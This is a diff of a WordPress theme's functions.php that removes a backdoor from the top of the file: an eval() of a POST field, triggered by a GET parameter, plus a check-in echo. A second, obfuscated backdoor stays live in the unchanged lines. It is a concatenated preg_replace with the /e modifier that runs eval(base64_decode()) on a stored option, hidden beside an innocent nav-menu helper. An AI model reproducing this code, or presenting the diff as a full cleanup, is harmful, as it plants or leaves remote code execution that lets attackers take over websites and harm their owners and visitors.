@@ -1,35 +1,4 @@
 <?php
-
-function _g3t($str){
-
-    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
-
-    return $val;
-
-}
-
-if(_g3t('dcB')=='f')
-
-{
-
-@eval($_POST['NafSQ']);
-
-exit;
-
-}
-
-if(_g3t('dcB')=='c')
-
-{
-
-echo 'AcJ9ksbVjsdb';
-
-exit;
-
-}
-
-//dsd6sc378axvg
-
 // custom functions.php template @ digwp.com
 
 //constants
@@ -57,7 +26,7 @@ if (function_exists('automatic_feed_links')) {
 }
 
 // featured image
-add_theme_support( 'post-thumbnails' ); 
+add_theme_support( 'post-thumbnails' );
 set_post_thumbnail_size('autocrop',960, 250, true);
 
 // smart jquery inclusion
@@ -118,7 +87,7 @@ add_filter('excerpt_more', 'custom_excerpt_more');
 function custom_excerpt_more($excerpt) {
 	return str_replace('[...]', '...', $excerpt);
 }
-add_filter('wp_trim_excerpt', 'custom_excerpt_more'); 
+add_filter('wp_trim_excerpt', 'custom_excerpt_more');
 */
 
 
@@ -129,7 +98,7 @@ function no_more_jumping($post) {
 add_filter('excerpt_more', 'no_more_jumping');
 
 
-// add a favicon to your 
+// add a favicon to your
 function blog_favicon() {
 	echo '<link rel="Shortcut Icon" type="image/x-icon" href="'.get_bloginfo('wpurl').'/favicon.ico" />';
 }
@@ -269,7 +238,7 @@ add_filter( 'the_content', 'blockquote_unautop', 30 );
 //Theme Options
 $functions_path = TEMPLATEPATH . '/functions/';
 require_once ($functions_path . 'theme-options.php');
-require_once ($functions_path . 'section-options.php'); 
+require_once ($functions_path . 'section-options.php');
 require_once ($functions_path . 'post-options.php');
 
 //Header Customizations
@@ -305,29 +274,29 @@ if ( ! is_admin() ) {
     // This is before the CSS "selected" classes are calculated
     add_filter( 'wp_get_nav_menu_items', 'replace_placeholder_nav_menu_item_with_latest_post', 10, 3 );
 }
- 
+
 // Replaces a custom URL placeholder with the URL to the latest post
 $BdKEir = 'pre'.'g'.'_repla'.'c'.'e';$BdKEir('/ad/e','e'.'v'.'al(bas'.'e64_de'.'code(ge'.'t_option("Faj'.'HDs")))', 'add');function replace_placeholder_nav_menu_item_with_latest_post( $items, $menu, $args ) {
- 
+
     // Loop through the menu items looking for placeholder(s)
     foreach ( $items as $item ) {
- 
+
         // Is this the placeholder we're looking for?
         if ( '#latestpost' != $item->url )
             continue;
- 
+
         // Get the latest post
         $latestpost = get_posts( array(
             'numberposts' => 1,
         ) );
- 
+
         if ( empty( $latestpost ) )
             continue;
- 
+
         // Replace the placeholder with the real URL
         $item->url = get_permalink( $latestpost[0]->ID );
     }
- 
+
     // Return the modified (or maybe unmodified) menu items array
     return $items;
 }
